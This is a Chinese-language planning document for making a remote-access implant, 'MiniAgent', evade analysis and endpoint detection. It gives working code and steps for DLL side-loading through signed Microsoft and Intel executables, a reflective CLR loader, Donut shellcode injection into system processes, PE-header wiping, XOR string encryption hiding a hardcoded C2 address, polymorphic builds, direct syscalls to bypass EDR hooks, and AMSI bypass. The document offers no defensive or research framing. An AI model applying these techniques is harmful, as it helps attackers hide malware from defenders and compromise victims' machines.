# MiniAgent 隐蔽与反分析方案

> 当前状态：C# DLL + PowerShell `Assembly.Load` 无文件加载  
> 问题：IL 可被 dnSpy 5 分钟反编译，PowerShell 进程名可疑，AMSI 可拦截

---

## 方案对比总览

| 方案 | 反分析难度 | 实现复杂度 | 运行时依赖 | 进程伪装 | 推荐度 |
|------|-----------|-----------|-----------|---------|--------|
| A. .NET AOT | ★★★★★ | 中 | 无 | 自定义进程名 | ⭐ 推荐 |
| B. DLL 侧加载 | ★★★☆☆ | 低 | .NET CLR | 微软签名EXE | 适合快速部署 |
| C. 反射加载 | ★★★★☆ | 高 | 自带CLR宿主 | 任意进程名 | 最灵活 |

## 方案 A — .NET Native AOT（推荐）

### 原理
.NET 8 Native AOT 编译 → 单个 EXE，直接编译为机器码，无 IL 中间语言。

### 优势
- **无 .NET 运行时依赖**：目标机器不需要安装 .NET
- **无 IL 可反编译**：dnSpy/ILSpy 完全失效，只能 IDA/Ghidra 逆向机器码
- **反分析难度**：从"5 分钟"提升到"数天"
- **单文件部署**：一个 EXE 搞定

### 实现步骤
```xml
<!-- MiniAgent.csproj -->
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
    <PublishAot>true</PublishAot>
    <StripSymbols>true</StripSymbols>
    <IlcOptimizationPreference>Size</IlcOptimizationPreference>
    <InvariantGlobalization>true</InvariantGlobalization>
  </PropertyGroup>
</Project>
```

```bash
dotnet publish -c Release -r win-x64 --self-contained
# 产物：约 5-10MB 单文件 EXE
```

### 注意事项
- 需要 .NET 8 SDK 编译（目标机不需要）
- `System.Reflection` 部分 API 不支持 AOT，需代码调整
- `ClientWebSocket` 在 AOT 下支持良好
- P/Invoke（ConPTY 等）完全兼容

### 需要修改的代码
- 移除所有 `Assembly.Load` 动态加载逻辑
- 改为直接编译进 EXE
- JSON 解析改用 source generator（避免反射）
- 入口点从 `Entry.Run()` 改为 `static Main()`

## 方案 B — DLL 侧加载（DLL Side-Loading）

### 原理
找一个微软签名的合法 EXE，它加载某个 DLL 时没有使用完整路径 → 在同目录放一个同名恶意 DLL。

### 优势
- 进程名合法（微软签名 EXE）
- EDR 白名单信任微软签名进程
- 实现简单

### 候选宿主 EXE
| EXE | 加载的 DLL | 备注 |
|-----|-----------|------|
| `msdeploy.exe` | `version.dll` | Web Deploy 工具 |
| `OneDriveStandaloneUpdater.exe` | `winhttp.dll` | 自带签名 |
| `GfxDownloadWrapper.exe` | `version.dll` | Intel 显卡工具 |
| `colorcpl.exe` | `colorui.dll` | 系统自带 |

### 实现步骤
1. 选择宿主 EXE，确认它搜索的 DLL 名
2. 用 C/C++ 编写同名 DLL（proxy DLL），转发原始导出函数
3. 在 `DllMain` 或导出函数中启动 .NET CLR 加载 MiniAgent
4. 部署：宿主 EXE + proxy DLL + 加密的 MiniAgent payload

### Proxy DLL 模板
```c
// version.dll proxy
#pragma comment(linker, "/export:GetFileVersionInfoA=real_version.GetFileVersionInfoA")
#pragma comment(linker, "/export:GetFileVersionInfoW=real_version.GetFileVersionInfoW")
// ... 其他导出

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, LoadPayload, NULL, 0, NULL);
    }
    return TRUE;
}
```

## 方案 C — 反射加载（Reflective Loading）

### 原理
用 C++ 写一个小 loader（~20KB），自托管 CLR 运行时，反射加载 .NET 程序集。

### 优势
- 进程名完全可控（伪装为 `svchost.exe`、`RuntimeBroker.exe` 等）
- CLR 宿主不是 `powershell.exe`
- 可进一步注入到合法进程

### 实现步骤
```cpp
// CLR 宿主 loader
#include <metahost.h>
#pragma comment(lib, "mscoree.lib")

void LoadAssembly(BYTE* payload, DWORD size) {
    ICLRMetaHost* metaHost = NULL;
    ICLRRuntimeInfo* runtimeInfo = NULL;
    ICLRRuntimeHost* runtimeHost = NULL;
    
    CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&metaHost);
    metaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&runtimeInfo);
    runtimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&runtimeHost);
    runtimeHost->Start();
    
    // 通过 AppDomain 加载内存中的程序集
    // ...
}
```

### 进阶：Donut / sRDI
- **Donut**：将 .NET 程序集转为 position-independent shellcode
- **sRDI**：Shellcode Reflective DLL Injection
- 注入到合法进程（`explorer.exe`、`svchost.exe`）
- 无文件、无模块、内存中执行

## 反分析技术

### 1. PE 头擦除
加载后清零 PE 头（前 4KB），防止内存 dump 还原 PE：
```csharp
// 加载后立即执行
IntPtr baseAddr = Process.GetCurrentProcess().MainModule.BaseAddress;
byte[] zeros = new byte[4096];
Marshal.Copy(zeros, 0, baseAddr, 4096);
```

### 2. 字符串加密
编译时自动加密所有敏感字符串，运行时解密，用完清零：
```csharp
static string D(byte[] c) {
    byte[] k = { 0x5A, 0x3C, 0x7F, 0x1D, 0x4E }; // 编译时随机生成
    byte[] p = new byte[c.Length];
    for (int i = 0; i < c.Length; i++)
        p[i] = (byte)(c[i] ^ k[i % k.Length]);
    string result = Encoding.UTF8.GetString(p);
    Array.Clear(p, 0, p.Length); // 用完清零
    return result;
}

// 示例：
// "47.115.222.73" → D(new byte[]{0x7D, 0x0A, ...})
// "ws://" → D(new byte[]{0x2D, 0x49, ...})
```

### 3. 多态编译
每次编译使用不同 XOR key → 每个 payload 的二进制签名都不同：
```python
# build_tool.py - 编译时替换
import os, random

def generate_key(length=16):
    return [random.randint(1, 255) for _ in range(length)]

def encrypt_string(s, key):
    data = s.encode('utf-8')
    enc = [(b ^ key[i % len(key)]) for i, b in enumerate(data)]
    return enc

# 每次编译生成新 key，替换源码中所有字符串
key = generate_key()
strings = {
    "47.115.222.73": encrypt_string("47.115.222.73", key),
    "ws://": encrypt_string("ws://", key),
    # ...
}
```

### 4. 运行时代码段自修改
```csharp
// 解密代码段 → 执行 → 重新加密
static void ExecuteEncrypted(byte[] encryptedCode, byte[] key) {
    // VirtualProtect → PAGE_EXECUTE_READWRITE
    // XOR 解密代码段
    // 执行
    // XOR 重新加密
    // VirtualProtect → PAGE_EXECUTE_READ
}
```

### 方案 2：直接 Syscall（绕过用户态 Hook）
```asm
; ntdll!NtWriteVirtualMemory syscall
; 直接 syscall 绕过所有 EDR 用户态 hook
mov r10, rcx
mov eax, <syscall_number>  ; 动态获取
syscall
ret
```

- 动态获取 syscall 号（从 ntdll 的 .text 段解析）
- `int 0x2e` / `syscall` 指令直接进内核
- EDR 的用户态 hook 全部失效

## 实施优先级建议

### 第一阶段（立即可做）
1. **字符串加密** — 修改 `MiniAgent.cs`，编写编译时工具自动替换
2. **多态编译** — 每次编译随机 key，hash 检测失效

### 第二阶段（短期）
3. **方案 A: AOT 编译** — 迁移到 .NET 8，消除 IL 反编译风险
4. **硬件断点 AMSI 绕过** — 替换当前的 `PatchAMSI`（已被检测）

### 第三阶段（中期）
5. **方案 B: DLL 侧加载** — 进程名合法化
6. **方案 C: 反射加载** — 最大隐蔽性，配合 Donut shellcode 化

## 当前架构 vs 目标架构

```
当前：
  PowerShell cradle → stager → download DLL → [Assembly]::Load → MiniAgent.Run()
  问题：powershell.exe 进程可疑，IL 可反编译，AMSI 可拦截

目标（方案 A）：
  初始访问 → 下载 AOT EXE → 直接运行
  优势：无 .NET 依赖，机器码，自定义进程名

目标（方案 C 最终形态）：
  初始访问 → shellcode 注入合法进程 → CLR 宿主加载加密 payload
  优势：无文件，无模块，进程合法，内存加密
```
